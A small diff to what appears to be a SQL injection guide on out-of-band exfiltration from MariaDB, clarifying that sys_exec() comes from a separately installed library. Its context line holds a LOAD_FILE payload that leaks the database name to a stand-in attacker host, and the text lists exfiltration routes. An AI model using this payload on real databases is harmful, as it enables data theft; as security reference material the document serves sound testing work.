@@ -86,7 +86,7 @@ SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\', DATABASE(), '\\file'))
 For HTTP-based out-of-band exfiltration, other mechanisms are required:
 
 - External UDFs (User Defined Functions) with network capabilities
-- Server-side command execution via `sys_exec()` (if installed)
+- Server-side command execution via `sys_exec()` (non-standard UDF from lib_mysqludf_sys, must be installed separately)
 - DNS exfiltration (covered above) - the most reliable OOB method for MariaDB
 - Writing data to web-accessible directories (covered below)
 
